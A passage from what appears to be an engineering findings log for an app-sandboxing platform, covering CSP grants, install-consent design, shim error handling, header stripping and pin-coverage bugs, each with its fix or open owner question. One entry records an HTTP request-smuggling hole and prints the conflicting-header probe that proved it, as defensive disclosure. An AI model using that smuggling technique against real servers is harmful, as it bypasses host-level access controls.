> drops `https.connect` from it. See A190's own resolution for the full account. This closes
> A167's own cross-reference: the union-of-outbound-capabilities reading is now `tcp.connect` +
> `udp.send`, an owner decision, not this lane's unconfirmed inference.

**Error code, not flagged -- reused, not invented.** A lookup that resolves nothing rejects
`'unreachable'`, which `errors.ts`'s own closed enum already documents as covering "DNS
failure." No new `OrivonErrorCode` was added.

**Verified, this lane:** `npm run typecheck` finds exactly 3 pre-existing-mock breaks (listed in
this lane's own log, `/home/jhon/.claude/orivon-fleet/lanes/L0-contracts/log.md`, and repeated
in this PR's body) -- `src/nostr/tests/nip07.test.ts` and `src/shim-electron/tests/index.test.ts`,
both constructing a hand-written `OrivonNet`/`OrivonFs` mock missing the new `lookup` method and
the widened `userSelected` overload. Not fixed here (test code outside `src/contracts/`, and
implementation-adjacent); the fix is one stub method and one signature update per file, mechanical
once this lane's shapes are confirmed.

**Needed by:** the A114 implementation lane (item 1), the `fs.open`/`fs.userSelected` broker lane
(item 2, compatibility-matrix.md Table 4 row 6), and whichever lane wires `node-dns.ts` to a real
broker capability (item 3, `A107`).

---

### A192 -- an app granted unlimited HTTPS gets exactly the same CSP as an app granted nothing, so the reach it was granted is blocked before any code runs **[NEEDS OWNER DECISION]**

`appReachCspHeaderValue` (`src/broker/policy/connect-src.ts`) builds `img-src`/`font-src`/`media-src`
from the granted `https.connect` patterns by reusing `connectSrcFor`. That function deliberately
OMITS a `*` host, classifying it `host-any-public-unicast`, and the reason is good: CSP's bare `*`
would also permit loopback and the LAN, which a `*` grant explicitly does not (`A82`).

The consequence was not noticed when the reach feature was built. A grant of `*:443` produces
`img-src 'self'; font-src 'self'; media-src 'self'` -- byte-for-byte what an app holding NO grant
gets. Chromium then refuses the subresource in the renderer, so `fetchThirdParty` never runs and the
live per-request gate never gets a say. **The feature is silently unreachable for the widest and
most likely declaration**, and `ADR-0017` names that declaration explicitly: *"an app may declare
unlimited HTTPS"*.

**Not fixed by the review run, deliberately.** The current behaviour fails CLOSED, and widening a
CSP directive is a security tradeoff -- the build queue's own stop conditions say a security
tradeoff wakes the owner rather than being decided by a run.

**The ask:** may the REACH directives only -- `img-src`, `font-src`, `media-src` -- emit the `https:`
scheme source for a `*` host?

**AI recommendation, labelled as one:** yes, and the asymmetry with `connect-src` is the argument.
For the schemes `protocol.handle` intercepts, every request is independently re-checked live by
`checkConnectSecure`, which still refuses loopback and the LAN whatever the header says -- so the
header is defence in depth and a momentarily-wider one grants nothing. `connect-src` cannot take the
same reasoning, because it also governs `wss:`, which is never intercepted and where CSP is
therefore the SOLE gate. That distinction is already load-bearing elsewhere in this design
(`A158`/#194's own revert), so this would apply an existing rule rather than invent one.

### A178 -- `grant-ledger.ts` reached exactly Rule 2's 500-line limit, and a second file is six lines from it **[RESOLVED 2026-09-15 for the first; NOTED for the second]**

`src/broker/grants/grant-ledger.ts` sat at exactly 500 lines -- passing `check:size`, which is
inclusive, with zero headroom. Resolved by continuing the split seam this file already has
(`grant-persistence.ts`, `update-safety.ts`, `declined-consent.ts` all came out of it): resource
allowances moved to `resource-limits.ts`, bringing it to 493 despite the A168 fix adding to it.

**Noted here as unfixed, and RESOLVED before this entry landed -- corrected 2026-09-16 rather than
published stale.** `src/broker/broker-contracts.ts` had reached 494 by accumulation (451, then 476,
then 494) across separate changes each individually reasonable. It is now **424**: the `fs.open`
lane split `fs-contracts.ts` out of it, because that lane's own addition would have crossed the
ceiling and it was briefed to split before adding rather than after discovering.

The diagnosis this entry recorded stands and is the reason to keep it: **Rule 2's limit breaks on
MERGE, not on a branch**, because two changes each under the ceiling cross it together. That is
exactly how it played out -- the file sat at 499 with two lanes queued against it, and the split was
scheduled deliberately instead of being hit mid-diff. Whoever next extends `Broker`'s contract
surface should still plan the seam before starting.

### A180 -- the app decides how much choice the person gets, and its incentive is always to offer none **[NEEDS OWNER DECISION]**

`requestInstallConsent` (`src/main/install-consent.ts`) takes the per-capability path only when the
MANIFEST declares `consentGranularity: 'per-capability'`; absent, `src/contracts/manifest.ts`
defaults it to `'all-or-nothing'`.

The recorded reasoning is sound and should not be thrown away: the app author is the only party who
knows whether their code survives a half-granted environment, and a ported app has no code path for
a missing filesystem grant any more than for a missing network one.

But the incentive runs one way. All-or-nothing gets the author everything they asked for, with less
friction and no half-granted state to handle. A rational author never declares `'per-capability'`.
**So the person's ability to refuse one thing is set by the party that wants it granted**, and the
consent granularity built for them may never be reachable in practice.

**This is not an imported framing. The project already made this exact argument about itself**, in
`ADR-0017`: *"If the prompt renders it the same way as a narrow declaration, every manifest will
declare unlimited and the prompt stops meaning anything."* Same structure, different field, never
applied here.

**The ask:** should the person be able to choose per-capability even when the manifest did not ask
for it -- for instance an always-available "Choose individually" affordance, with the manifest's
declaration downgraded from a gate to a hint about what the app can actually cope with? Anything
here is a real product decision about who holds the choice, so it is the owner's, not a run's.

Found by the named-persona review pass, through the product lens; no other mechanism surfaced it.
### A169 -- a shim member the package refuses by name threw when it was READ, not when it was called, turning a library's defensive feature check into a crash **[RESOLVED 2026-09-15 -- lane FIX-2]**

`refusingProxy` (`src/shim-electron/unimplemented.ts`, reused through `src/shim/unimplemented.ts`)
threw from its `get` trap. A `get` trap fires on a property **read**, not only on a call, so every
ordinary cross-version feature check crashed instead of reporting absence:

    typeof net.getDefaultAutoSelectFamily === 'function'   // threw
    fs?.watchFile?.()                                      // threw at the read
    const { watchFile } = fs                               // threw
    'watchFile' in fs                                      // false -- the only safe idiom

Before the named-refusal work this was a graceful `undefined` and the library skipped the branch.
A check at module top level -- a common shape in compat shims -- made importing the dependency at
all fatal. The modules affected were `net`, `http`, `https`, `dns` and `fs`: precisely the ones the
flagship's dependency graph uses.

**`src/shim/README.md` had already reached the right conclusion for socket INSTANCES** -- "a
throw-on-read proxy would make a defensive check itself throw, turning a graceful, intentional skip
into a crash" -- and ships `ref()`/`unref()` no-ops plus throw-on-call methods there. That reasoning
was simply never applied to the five module-level wraps. The fix extends the existing, already-argued
pattern rather than inventing a new one: the `get` trap now returns a real function that throws the
same named error only when **invoked**.

**One requirement could not be met as literally stated, and was not faked.** Making
`typeof x.y === 'function'` read `false` while a call still throws is impossible: a Proxy's
callability, and therefore its `typeof`, is fixed by whether its target is callable at construction,
never by a trap. Verified empirically rather than argued from the spec. The achievable half was
built -- reading no longer throws -- and the residual tension is filed as `A182`.

`fs.constants` and `dns.promises` are narrow, deliberate exceptions: real Node exposes both as data
objects, so a throwing function in those slots would misreport their type. They are listed
explicitly with value `undefined`, genuinely absent. Side effect, documented in the source: those two
names report `true` for `in` where every other unbuilt member reports `false`.

### A177 -- two incompatible shim error taxonomies, so `instanceof OrivonShimError` missed three of them **[RESOLVED 2026-09-15 -- lane FIX-2]**

`OrivonShimError`'s header claims "one error type for a member `src/shim/`'s modules refuse by
name". Three older classes -- `OrivonHttpUnsupportedError`, `OrivonNetUnsupportedError`,
`OrivonDnsUnsupportedError` -- coexisted with it, shaped differently (a `.code` constant, no
`.reason`, no `.api`) and still thrown for `createServer()` and `dns.lookup()`, i.e. for gaps in the
very same modules the new mechanism covered for every other member. A porting developer writing
`catch (e) { if (e instanceof OrivonShimError) handleRefusal(e.reason) }` silently missed all three.
The three now extend `OrivonShimError`, with `.message`/`.name`/`.code` verified unchanged.

**`OrivonFsUnsupportedError` (`src/shim/node-fs-unsupported.ts`) is a fourth instance of the same
problem and is NOT fixed here** -- the lane's brief named three classes, and it reported the gap
rather than silently widening its own scope. It should be folded in.

### A182 -- after A169, a feature-detecting library takes the branch and throws at the call, where it once skipped **[NEEDS OWNER DECISION]**

Trace one library's defensive check across the three states:

| | `typeof x.y` | what the library does |
|---|---|---|
| before the named-refusal work | `'undefined'` | skips the branch -- **works** |
| after it (`A169`'s bug) | *throws* | **crash at detection** |
| after `A169`'s fix | `'function'` | takes the branch, the call throws -- **crash at use** |

`A169`'s fix is a clear improvement and should ship: a named error at the call site beats an
inexplicable throw at a property read. But the crash **moved** rather than went away, and for a
library that feature-detects and then calls, pre-existing compatibility is not restored.

**The real fix is not a Proxy trick, and `A169` already demonstrated it** for `fs.constants` and
`dns.promises`: list the member explicitly with value `undefined` so it is genuinely absent, exactly
as real Node reports a member this package never considered. The open question is **which members
get that treatment**, and it is a straight conflict between two goals the owner has endorsed
separately:

- **`A135`, named refusals** -- a missing feature must announce itself by name, so a person can tell
  a gap from a broken browser. Serves the person debugging.
- **The shim's reason to exist** -- run unmodified third-party code. The flagship is `webtorrent`
  over exactly these modules. Serves the app that would otherwise crash.

The existing reason enum already carries a distinction that could decide it -- `'not-built'` /
`'unimplemented'` / `'not-applicable'` -- but nothing maps those onto visible-versus-invisible
today. **AI recommendation, explicitly retunable:** a member Orivon has decided it will never
implement is better invisible (the app degrades gracefully); a member that is planned but unbuilt is
better named (the developer learns why). That is a guess at the owner's intent, not a decision.
### A176 -- two ways `scripts/check-manifest-parity.mjs` (A165) could silently pass when it should fail **[RESOLVED 2026-09-15 -- lane FIX-5]**

**Both found independently by two reviewers, reviewing the A165 landing**, and both reproduced
against the real exported functions before either was touched. Both are the same shape as A164
itself: a way a contract field an app author could rely on gets refused at install, with the one
check that exists to prevent exactly that not firing.

1. **Nested inline-object fields were flattened.** `interfaceFields`'s regex matched every
   `readonly <name>` between an interface's braces, tracking brace depth only to find the
   interface's own closing brace -- not to tell a field at the interface's own top level apart
   from one nested inside another field's inline object type. `interfaceFields('export interface
   Foo { readonly bar?: { readonly nested: string }\n readonly baz: number }', 'Foo')` returned
   `['bar', 'nested', 'baz']` -- `nested` is `bar`'s own child, not `Foo`'s sibling. Dormant
   today (no tracked interface in `PARITY_MAP` has such a field), but the day one does, this either
   fails CI on a phantom name that cannot sensibly go in `DELIBERATELY_DEFERRED`, or -- worse --
   a nested name collides with a real top-level key and silently masks that the nesting was never
   checked.
2. **A field missing the `readonly` keyword vanished entirely.** The regex required
   `readonly\s+(\w+)`, so `{ readonly a: string; b: number }` with loader array `['a']` yielded
   `ok: true, gaps: []` -- `b` never appeared anywhere. Nothing in this repo mechanically enforces
   the `readonly` convention (there is no linter), so this was one dropped keyword away from
   exactly the drift the check exists to catch.

**The fix, both cases, in `scripts/check-manifest-parity.mjs`.** `interfaceMembers` (the renamed,
now-internal core of what `interfaceFields` used to do alone) tracks brace depth AND paren depth
over the interface body and only treats brace-depth-1, paren-depth-0 text as a candidate member --
text inside a nested `{ ... }` is masked out entirely rather than scanned, which fixes point 1 (the
paren tracking is free hardening against a function-typed field's parameter list matching the same
way; no tracked interface has one today, but the failure mode would have been identical). The
member regex now matches a field whether or not `readonly` precedes it, and records which; a
missing keyword no longer drops the field -- `interfaceFields` still returns its name (so gap
detection against the loader continues working), and the new `nonReadonlyInterfaceFields` /
`checkManifestParity`'s new `missingReadonly` list reports the dropped keyword itself as its own
failure, **independent of whether the field's name happens to already be in the loader's
allowlist** -- the missing keyword is the defect, not a proxy for one. `ok` is false whenever
`gaps`, `unreadable` or `missingReadonly` is non-empty.

**Why report-the-gap-either-way rather than reject the field as unparseable.** The alternative
(treat a non-`readonly` member as unreadable, the same fail-closed path as a missing interface)
was rejected: `unreadable` means "this check's own regex cannot find something it expects to
exist," which is a true statement about the interface or array as a whole, not about one member
inside a body the check found fine. Folding a convention violation into that path would make
`unreadable`'s message ("fix the check before trusting it") wrong for this case -- the check
found the field correctly; the field itself is what needs fixing. A dedicated `missingReadonly`
list keeps the two failure classes distinguishable in the output.

**Verified**, reproduced live in this lane (pasted into the PR body): `interfaceFields` on the
task's literal nested-object repro now returns `['bar', 'baz']`, not `['bar', 'nested', 'baz']`;
on the missing-`readonly` repro (`{ readonly a: string; b: number }`) it now returns `['a', 'b']`,
not `['a']`, and `nonReadonlyInterfaceFields` returns `['b']`. Both new behaviours, plus a
`checkManifestParity`-level test proving a field missing `readonly` fails even when the loader
array already lists it (the dropped-keyword case, isolated from the gap case), are asserted in
`scripts/tests/check-manifest-parity.test.ts`. The real tree still passes:
`checkManifestParity(process.cwd())` returns `{ ok: true, gaps: [], unreadable: [],
missingReadonly: [] }` unchanged.

### A179 -- a second hand-maintained duplicate of a shape, created two PRs after the guard (A165) against exactly this **[RESOLVED 2026-09-15 -- lane FIX-5]**

**The shape.** `src/loader/pin-coverage.ts`'s `PinCoverageSnapshot` and
`src/trust/delivery-ladder.ts`'s `PinCoverageEvidence` are field-for-field identical
(`pinnedRequests`, `thirdPartyRequests`, `deniedRequests`, `pinnedBytes`, `thirdPartyBytes`,
`bytesIncomplete` -- same names, same types, in both). The duplication itself is deliberate and
correct: `src/trust/README.md` forbids reaching into `src/loader/`'s internals, and
`src/loader/README.md` does not list `src/trust/` among what it may import either, so the two
streams cannot share one type across that boundary. **The defect is that nothing bound the two
copies together** -- add a field to one and the other silently does not get it; no test, no
typecheck and no CI gate fails. This is A165's own failure mode (a contract shape and a
hand-maintained second copy of it drifting apart, unnoticed until something downstream breaks),
reintroduced two PRs later, in a place `check-manifest-parity.mjs`'s regex cannot reach: there is
no hand-maintained array here to diff against a source file, because both sides here ARE the
source.

**The fix does not touch either module.** Per `src/trust/README.md`'s own "defined once in each
direction, not imported across" note, the duplication stays. `scripts/tests/pin-coverage-
parity.test.ts` (new file, in `scripts/tests/` rather than either stream's own directory --
comparing the two types requires importing both, and importing both from inside `src/trust/` or
`src/loader/` would itself be the boundary violation their READMEs forbid; `scripts/` answers to
neither) binds the two types with a type-level equality check: `Equals<PinCoverageSnapshot,
PinCoverageEvidence>` via the standard distributive-conditional-type trick
(`(<T>() => T extends A ? 1 : 2) extends (<T>() => T extends B ? 1 : 2) ? true : false`), asserted
`true` through `AssertEqual<T extends true>`. A plain mutual `A extends B` / `B extends A` check
would not have been enough on its own to explain as obviously safe -- TypeScript's structural
typing already lets a type with an extra field satisfy `extends` against a narrower one, so a
field added to only one side is not guaranteed caught by both directions naively; the
distributive-conditional form does not have that gap; it fails to reduce to `true` for any
difference at all -- added, removed or retyped, on either side. Follows the precedent
`src/loader/tests/manifest-contract-parity.test.ts` set for A164/A165: a type mismatch here is an
`npm run typecheck` failure, not a silent gap or a runtime-only assertion.

**Proven to actually fail, not just written and trusted**, in this lane: a field
(`a179ProofField: number`) was added to `PinCoverageSnapshot` alone, and `npm run typecheck`
failed at the new test's own `Equals<...>` line --
`scripts/tests/pin-coverage-parity.test.ts(55,48): error TS2344: Type 'false' does not satisfy
the constraint 'true'.` -- plus a second, expected error at the test's own runtime-proof line
(65,11) and an unrelated pre-existing error inside `pin-coverage.ts` itself from the now-missing
field on its own tracker's return value (a side effect of the deliberately-broken fixture, not
part of the binding). The field was then removed and `npm run typecheck` was re-run clean;
`git diff --stat src/loader/pin-coverage.ts` showed no changes, confirming a clean revert.
### A181 -- pin coverage is measured but nothing reads it yet **[NOTED -- deferred by design, not a defect]**

**Raised 2026-09-15**, docs-correction lane FIX-6, while checking `A166`'s claims against the
tree.

`stream/trust-02-pin-coverage` (PR #198) built the measurement `A166` asked for --
`src/loader/pin-coverage.ts` tracks, per origin, how many requests and bytes came from the pin
versus a granted third-party host -- but nothing in production reads it back out.

**Verified by grep, both claims:**
- `pinCoverageFor` (`src/loader/electron-serve.ts:49`) has no caller anywhere under `src/`
  outside its own test file (`src/loader/tests/electron-serve.test.ts`).
- `deliveryLadder` (`src/trust/delivery-ladder.ts`) has no call site anywhere under `src/`
  outside its own test file -- so `DeliveryHistoryInput.pinCoverage` is never supplied by
  production code either; nothing yet constructs the input that would carry a coverage snapshot
  into the ladder in the first place.

**Not a defect.** The file's own comment on `PinCoverageEvidence` says this plainly: "this
scores nothing; see build step 6 for how it renders." The measurement was scoped and built
ahead of the UI that will eventually read it, which is a reasonable order to build in.

**Why it is filed anyway.** PR #198's own title ("measure how much of a served app's pin
actually covers what it runs") promises a measurement, and a reader who did not also read the
source comment would reasonably assume the number already reaches somebody -- a person, a log,
anything. It does not yet. See `A166`'s 2026-09-15 update for the same gap from the ladder's
side.

**Needed by:** build step 6, same as `A166` -- no new lane implied by this entry; it records
current state so the next reader does not have to re-derive it from `grep`.
---

### A170 -- "Deny" on the install dialog did not take back a capability the dialog itself listed **[PARTIALLY RESOLVED 2026-09-15 -- lane FIX-3; the second half needs the owner]**

The all-or-nothing install dialog deliberately shows the **whole declared set**, not the outstanding
subset -- `src/main/README.md` argues for that explicitly, and it is the right call: a person
choosing all-or-nothing must see the complete picture. `describeInstallConsent` renders that set
under the literal heading **"This app wants to:"**.

But a capability can already be **held** at that moment. `app.requestGrant` is a documented second
door, and `registerApp` runs before `requestInstallConsent` in `app-install.ts`'s `finishInstall`,
so an app can obtain one declared capability out of band, with its own separate dialog, before the
install dialog is ever shown -- `install-consent.ts`'s own "not held" filter exists precisely
because that state is reachable.

So a person read a list containing something the app already had, clicked **Deny**, and the app kept
it. Nothing in the dialog distinguished a held row from a requested one: `describeInstallConsent`
was never given the held set, so it **could not** mark them -- while the per-capability screens
already marked earlier answers `[Allowed]`/`[Denied]`, which made the all-or-nothing dialog the odd
one out rather than a considered exception.

**Fixed:** the held subset is now passed to the renderer and already-held rows are marked
`[Already allowed]`, matching the bracket convention `describeCapabilityChoice` already used. Deny
visibly applies to the rest. A row that merges two capabilities is marked only when **every**
contributing capability is held.

**STILL OPEN, and it is an owner decision, not an implementation gap:** should Deny also **revoke**
the already-held capability? Taking away a grant the person separately agreed to, because they
declined a different question, is a real behaviour change with its own surprise -- so the run
deliberately did not build it. The dialog now tells the truth either way; the question is whether
the truth it tells is the one the owner wants.

### A172 -- the declined-consent record was kept three inconsistent ways, and one of them made a capability permanently un-askable **[RESOLVED 2026-09-15 -- lane FIX-3]**

All three in `src/main/install-consent.ts`, found independently by two reviewers and `/code-review`:

1. **It recorded too much.** The decline branch wrote the *entire declared set*, including a
   capability that was currently **held**. Concrete harm: an origin declares `{tcp.connect, fs}`;
   `fs` is already held through the second door; the person declines; `fs` is written into the
   declined record. The person later revokes `fs` from the settings list -- `revokePersisted`
   touches `grants`, never `declinedCapabilities` -- and on the next visit nothing is outstanding,
   so **the dialog never returns and `fs` can never be offered again.** A declined entry needs no
   live grant to suppress a future dialog, which is what made this permanent.
2. **Replace versus append.** The all-or-nothing branch REPLACED the record; the per-capability
   branch APPENDED. A manifest switching `consentGranularity` between visits could therefore drop an
   earlier per-capability "no". The module's own doc claimed a refusal "is never a decline of
   anything OUTSIDE this round" -- true of one branch only.
3. **Cleared on one accept path of three.** `clearDeclinedConsent`'s only caller in the tree was
   this file's own all-or-nothing accept branch. A "yes" reached through `app.requestGrant`, or
   through `update-outcomes.ts`'s accepted capability prompt, left the persisted decline in place --
   contradicting the stated invariant that an old "no" cannot outlive a "yes".

**Fixed:** a decline now records only what was actually outstanding this round; both branches write
through one `recordDeclined` helper that always appends, so "declined" cannot mean different things
depending on which branch ran; and both other accept paths now retire the relevant decline --
`request-grant.ts` retires just the one capability it granted, composed from existing `Broker`
methods so no new broker primitive was needed, and `update-outcomes.ts`'s capability-prompt accept
clears the whole record, justified because its `requestedPatterns` is the manifest's current
declared set, the same shape as the all-or-nothing accept.
### A173 -- `serve-reach.ts`'s outbound request body was buffered unbounded in the main process **[RESOLVED 2026-09-15]**

**Raised and fixed 2026-09-15**, lane FIX-4 (`stream/loader-10-reach-hygiene`), an independent
review finding re-verified by the fleet conductor reading the code before this lane started.
`nodeReachDial` (`src/loader/serve-reach.ts`) read an app's own request body with
`Buffer.from(await request.arrayBuffer())` -- the file's own header carefully argues the
RESPONSE side needs no size cap (`Readable.toWeb` streams it) and says nothing about the
request, which is the gap: a page `fetch()`-ing a large or effectively unbounded body to a
granted `https.connect` host drove unbounded allocation in this **privileged main process**,
not the sandboxed renderer.

**Fixed by `readCappedBody`**, a streaming reader over `request.body` that rejects the instant
the running total would exceed `REACH_MAX_REQUEST_BODY_BYTES` (16 MiB), never buffering past
the cap first -- the same discipline `src/preload/fetch-route.ts`'s own `readAllCapped` already
uses for its response body. The cap VALUE matches that file's own `ROUTED_FETCH_MAX_BODY_BYTES`
exactly (16 MiB is the number this repo already chose once for "an unbounded page-supplied body
must not be buffered whole"), but it is a second literal, not an import: `src/loader/` and
`src/preload/` sit on opposite sides of a trust boundary neither may import across
(`src/loader/README.md`'s "what it must never import" / `src/preload/README.md`'s own list),
and there is no third neutral home for a single numeric constant that would justify the
cross-boundary wiring -- `src/shared/` exists for exactly this kind of case but is deliberately
still empty (code-guidelines.md), and adding its first occupant was judged out of scope for a
three-defect hygiene lane. AI recommendation, not an owner decision: an owner call on whether
this constant belongs in `src/shared/` once a second real user of it exists would settle this
more permanently.

**Verified (this lane):** a test sending a body one byte over the cap now rejects with a
`REACH_MAX_REQUEST_BODY_BYTES`-naming `TypeError`, confirmed to resolve (not reject) against the
pre-fix code first; a body exactly at the cap still succeeds. `src/loader/tests/serve-reach.test.ts`.

### A174 -- `serve-reach.ts` forwarded hop-by-hop response headers verbatim, including a `transfer-encoding` that was already false **[RESOLVED 2026-09-15]**

**Raised and fixed 2026-09-15**, lane FIX-4, same review pass as A173. `forwardedRequestHeaders`
already stripped `host`/`connection`/`content-length` with an explicit
`HOP_BY_HOP_REQUEST_HEADERS` set; `forwardedResponseHeaders` had no strip set at all, so
`transfer-encoding`, `connection` and `keep-alive` were copied onto the `Response` handed back
to `serve.ts`'s `fetchThirdParty`. `transfer-encoding: chunked` is the concrete harm: Node's
`http` parser has already de-chunked the body by the time `IncomingMessage` emits anything, so a
forwarded `transfer-encoding` header describes wire framing that no longer exists on the stream
the app actually reads -- simply false, not merely redundant.

**Fixed** with a second strip set, `HOP_BY_HOP_RESPONSE_HEADERS`, covering the full RFC 7230
SS6.1 hop-by-hop list (`connection`, `keep-alive`, `proxy-authenticate`, `proxy-authorization`,
`te`, `trailer`, `transfer-encoding`, `upgrade`) rather than only the three the finding named --
these are all headers describing a hop that has already ended by the time this `Response` is
built, and there is no principled reason to strip three of the eight and forward the rest. Kept
as a second, separately-documented set rather than unified with the request side's: the request
set strips `host`/`content-length` for a DIFFERENT reason (Node computes those itself from what
it is handed, not because they are hop-by-hop), so a single shared set would either miss those
two or mis-describe why `transfer-encoding` matters on the response side specifically.

**Verified (this lane):** a test against a real chunked, `Connection: keep-alive`-declaring TLS
response confirms all three headers are now absent from the `Response` while `content-type`
still passes through untouched -- confirmed to fail against the pre-fix code first (transfer-
encoding measured as `'chunked'`, not `null`). `src/loader/tests/serve-reach.test.ts`.

### A175 -- pin coverage counted the whole pinned asset's size even when a Range request served only a slice, or nothing at all **[RESOLVED 2026-09-15]**

**Raised and fixed 2026-09-15**, lane FIX-4, same review pass as A173/A174.
`createAppRequestHandler` (`src/loader/serve.ts`) called `recordCoverage?.('pinned',
content.length)` BEFORE `buildResponse` applied the request's `Range` header, so a 10 MB video
fetched in many range requests recorded the full 10 MB every single time, and an unsatisfiable
range (416, no body at all) recorded the full asset size for zero bytes actually sent. Third-
party requests were never affected -- `fetchThirdParty` already records the peer's own
`content-length`, read after the real response exists -- so this skewed the pinned-vs-third-
party ratio specifically, the measure `src/trust/README.md` calls load-bearing and the reason
this whole coverage mechanism (ADR-0006's D-ladder, #198) exists.

**Fixed** by moving the `recordCoverage?.('pinned', ...)` call to AFTER `buildResponse` runs,
and reading the byte count off the response it actually built (`contentLengthOf`, the same
helper `fetchThirdParty` already used for the identical purpose on its own side -- one
implementation of "read the byte count off the `Response` you are about to return," not two).
`buildResponse` always sets `content-length` on a 200 or 206; a 416 sets none, handled as an
explicit `0` rather than falling through to `contentLengthOf`'s `undefined` -- a 416's zero
bytes-sent is a KNOWN value, not a size that could not be measured, so it must not trip
`pin-coverage.ts`'s own `bytesIncomplete` flag (that file's header: "a missing size sets
`bytesIncomplete`, never a silent zero" -- which is exactly backwards for a case where the
silent zero IS the correct, measured answer).

**Verified (this lane):** three tests confirmed failing against the pre-fix code first (a single
5-byte range recorded 300; fifty 10-byte range requests recorded 15000, not 500; a 416 recorded
300, not 0), then passing after the fix; a fourth confirms a denied same-origin request still
adds nothing. `src/loader/tests/pin-coverage.test.ts`.

### A183 -- an app could smuggle a second request past the one host its grant names **[RESOLVED 2026-09-15 -- found by the review run's own security pass]**

`nodeReachDial` (`src/loader/serve-reach.ts`) stripped only `host`, `connection` and
`content-length` from the OUTBOUND request. RFC 7230 SS6.1's remaining hop-by-hop headers --
`transfer-encoding` above all -- were forwarded from whatever the app set, and nothing upstream of
this file restricts an app's headers.

**`nodeReachDial` sets `content-length` itself.** So a forwarded `transfer-encoding: chunked`
arrives ALONGSIDE it. Measured rather than assumed, with a probe against Node's own client:

    POST / HTTP/1.1
    transfer-encoding: chunked
    content-length: 5
    ...
    "5\r\nhello\r\n0"

Node sends **both** headers and chunk-frames the body. A front-end and a back-end that disagree
about which header ends the request is the whole of request smuggling, and here the app controls
every header and every body byte.

**Why this is a capability escape and not a generic web bug.** The grant authorises one host. A
smuggled second request is processed by whatever sits behind that host's front-end -- another
virtual host, another backend -- which the person never granted and the broker never checked.
`checkConnectSecure` authorises the connection; it cannot see a second request hidden inside the
first one's body.

**Fixed** by stripping the full RFC 7230 SS6.1 set on the request side, the same set the response
side had just gained. The regression test asserts on the headers the PEER ACTUALLY RECEIVED --
echoed back from the test server -- because asserting on the `Request` handed in would only re-read
the test's own input, never what Node put on the socket. Verified to FAIL against the unfixed strip
set and pass with it.

**How it was found, because the method is the transferable part:** the fix that landed
`A174` added a hop-by-hop set for the RESPONSE and left the REQUEST side's three-entry set
untouched. The asymmetry was the tell. Reading it raised the question; a probe answered it.
### A184 -- `orivon.fs.open` is built end to end for its RPC-shaped methods; `readable()`/`writable()` stop at the broker layer, not yet page-reachable **[AI-REC -- readable/writable deferral is a scope call, not a discovered blocker; the other judgment calls below are flagged, not owner-reviewed]**

**Raised 2026-09-15**, lane L2-fsopen (`stream/broker-15-fs-open`). `FileHandle`
(`docs/architecture/handle-contracts.md` §FileHandle, `src/contracts/handles.ts`) needed no
`src/contracts/` change -- the shape was already complete -- so this lane built the broker
capability (`src/broker/fs-capability.ts`, `src/broker/adapters/node-fs-adapter.ts`), the
control-channel dispatch (`src/broker/transport/dispatch-fs.ts`) and the preload surface
(`src/preload/orivon-surface.ts`, `src/preload/main-world-socket.ts`) in one PR.

**What is genuinely done, page-reachable, and tested against real I/O:** `open`, positional
`read`/`write` (no implicit cursor, matching the contract's own explicit-position rule), `stat`,
`truncate`, `sync` and `close`, each confined once at open time and running under the same
per-origin in-flight budget and write quota `readFile`/`writeFile` already use. Confinement,
grant-absence, revocation-mid-operation and quota-exceeded are all covered by a failing-path test,
not only the success path (`src/broker/tests/fs-open.test.ts`,
`src/broker/adapters/tests/node-fs-adapter-open.test.ts`).

**Still open, by design, a scope call under this lane's own ordering constraint ("keep the
dispatch cases minimal") rather than a gap discovered mid-build:** `readable()`/`writable()` are
real, tested WHATWG streams at the broker/adapter layer (proven directly against a real fd), but
there is no CONTROL_CHANNEL case delivering one to a page the way `net.connect`'s byte pump does
for a `TcpSocket` -- `port-pump.ts`/`port-sink.ts` are already generic enough to relay either one
over a socket's dedicated port (nothing in them is TCP-specific), so this is wiring work, not a
redesign. `window.orivon.fs.open(...)`'s returned object is therefore deliberately narrower than
`FileHandle`: no `readable`/`writable`, and `closed` is not live-pushed -- it settles on an
explicit `close()`, and a broker-side revocation the app never asked for surfaces only on the
NEXT operation attempted against the handle, not proactively. This is the same category of gap
`net.connect` itself had for three of its four landing PRs (`CLAUDE.md`'s own history).
`orivon.fs.userSelected` is untouched by this lane -- A167 item 2's `DirectoryHandle`/folder-
picker judgment calls are still unconfirmed and still need their own implementation lane.

**Flagged AI judgment calls, not owner-reviewed, all in `src/broker/README.md`'s own design
note for this lane (search `A184`) with the full reasoning -- summarised here:**

1. **`FailableFileHandle` has no `abort()`**, unlike `FailableTcpSocket`. A `FileHandle`'s
   `readable()`/`writable()` are factories an app may call more than once concurrently, unlike a
   `TcpSocket`'s one fixed duplex, so "abort the file" has no single stream to mean -- aborting a
   `writable()` stream discards only that stream's own buffered bytes, never reaching into the
   handle table.
2. **`writable()`'s quota check ERRORS the stream on the chunk that exceeds it**, unlike
   `udp.send`'s A87 counted, never-rejecting loss. A dropped datagram is ordinary P2P traffic; a
   silently dropped byte in a positional file write is silent corruption. Positional `write()`
   and the `writable()` stream share one running `reserveFsBytes`/`releaseFsBytes` counter, so
   neither path can be used to exceed the declared quota the other already enforces.
3. **`destroy()`'s close-reason-conditional teardown (mirroring `destroySocket`'s A84 fix)
   deliberately does not reuse its `CLOSE_DRAIN_TIMEOUT_MS`.** A local `fs.WriteStream` drains to
   the OS's own `write()` syscall, bounded by real disk I/O, never by a remote peer that can
   simply stop reading -- the hazard that timeout exists for. Proven directly (not assumed):
   `node-fs-adapter-open.test.ts` fires a write without awaiting it and calls `destroy()` a line
   later, deterministic because a real fs write cannot complete before the test's own next
   synchronous statement runs.
4. **`open`'s flags string is checked against Node's own documented flag set** (`'r'`, `'r+'`,
   `'w'`, `'wx'`, ... -- `fs-capability.ts`'s `VALID_OPEN_FLAGS`) before the confined path or the
   grant are even consulted, so a malformed flags string is `'invalid'` (an app bug) rather than
   whatever the raw adapter call happens to throw for it. No numeric-mode variant is accepted --
   `capability-api.ts`'s `open` types `flags` as a `string`, never a number.
5. **Confining once, at `open`, is sufficient for a handle that outlives the call that created
   it** -- this lane's own brief asked this to be thought through and written down, not assumed.
   Every operation after acquisition addresses the real OS file descriptor, never the path again,
   so there is nothing left for a second confinement check to catch; a symlink swapped in after
   `open()` returns cannot retarget an already-open fd the way it could a second path lookup.

**A usage-limit interruption cut this lane's first attempt off mid-verification (2026-09-15),
resuming as the SAME A184** -- not a separate finding, recorded here because the defect it left
behind is the kind of thing a reviewer would otherwise have to rediscover. The interrupted run's
last action was reverting `destroy()`'s abrupt-teardown fix to confirm its own regression test
